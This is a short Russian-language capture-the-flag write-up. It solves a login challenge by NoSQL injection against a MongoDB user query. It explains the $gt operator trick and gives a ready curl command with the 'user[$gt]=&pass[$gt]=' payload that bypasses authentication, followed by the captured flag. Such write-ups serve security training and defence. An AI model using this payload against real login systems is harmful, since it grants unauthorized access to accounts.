# Решение

Подсказка говорит, что это **не SQL-инъекция**, а NoSQL.

Форма логина отправляет POST на `/`. На сервере используется запрос вида:

```js
User.findOne({ user: req.body.user, pass: req.body.pass })
```

Если отправить параметры как вложенные (`user[$gt]` и `pass[$gt]`), то `req.body.user` станет объектом `{"$gt": ""}`. В MongoDB это условие означает «значение больше пустой строки», и оно будет истинным для почти любого пользователя.

## Эксплуатация
Например, так:

```bash
curl -s -X POST 'http://HOST/' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'user[$gt]=&pass[$gt]='
```

В ответе получаем строку:

`Welcome back SplitCTF{NoSQLInjectionExample}!!!`

## Флаг
`SplitCTF{NoSQLInjectionExample}`
